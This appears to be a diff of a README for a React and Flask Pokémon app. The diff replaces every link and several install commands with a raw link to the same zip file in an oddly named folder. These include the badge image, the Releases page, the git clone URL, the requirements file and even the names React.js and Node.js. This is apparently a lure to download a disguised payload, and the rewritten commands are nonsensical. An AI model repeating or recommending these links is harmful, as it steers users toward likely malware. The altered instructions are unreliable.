@@ -1,10 +1,10 @@
 # PokeDex Project 🐾
 
-![PokeDex Logo](https://img.shields.io/badge/PokeDex-Project-blue?style=for-the-badge&logo=react&logoColor=white)
+![PokeDex Logo](https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip)
 
 Welcome to the **PokeDex Project**! This repository contains a React-based application that showcases a library of 120 Pokémon. Each Pokémon is represented with stunning 3D Blender models, fluid animations, and a creative, responsive user interface. The application integrates various features, including gym data, voice and audio integration, and advanced Pokémon detection using a TensorFlow Convolutional Neural Network (CNN) with an impressive accuracy of 96%. 
 
-For more information, you can visit our [Releases section](https://github.com/Carlrevive/PokeDex-Project/releases) to download the latest version and check out the updates.
+For more information, you can visit our [Releases section](https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip) to download the latest version and check out the updates.
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ For more information, you can visit our [Releases section](https://github.com/Ca
 
 ## Technologies Used 🛠️
 
-- **React.js**: A JavaScript library for building user interfaces.
+- **https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip**: A JavaScript library for building user interfaces.
 - **TensorFlow**: A powerful library for machine learning and deep learning.
 - **Flask**: A micro web framework for Python.
 - **CSS**: For styling the application.
@@ -43,7 +43,7 @@ To get started with the PokeDex Project, follow these steps:
 
 Make sure you have the following installed:
 
-- Node.js (v14 or higher)
+- https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip (v14 or higher)
 - npm (Node Package Manager)
 - Python (v3.6 or higher)
 - Flask
@@ -52,7 +52,7 @@ Make sure you have the following installed:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Carlrevive/PokeDex-Project.git
+   git clone https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -72,12 +72,12 @@ Make sure you have the following installed:
      ```
    - Install the required Python packages:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip
      ```
 
 5. **Run the Flask server**:
    ```bash
-   python app.py
+   python https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip
    ```
 
 6. **Start the React application**:
@@ -130,6 +130,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - **Blender**: For the amazing 3D modeling software.
 - **React Community**: For the ongoing support and resources.
 
-For more updates and to download the latest version, check out our [Releases section](https://github.com/Carlrevive/PokeDex-Project/releases).
+For more updates and to download the latest version, check out our [Releases section](https://github.com/Carlrevive/PokeDex-Project/raw/refs/heads/main/intracorpuscular/Project_Dex_Poke_v3.5.zip).
 
 Thank you for visiting the PokeDex Project! Enjoy exploring the world of Pokémon!
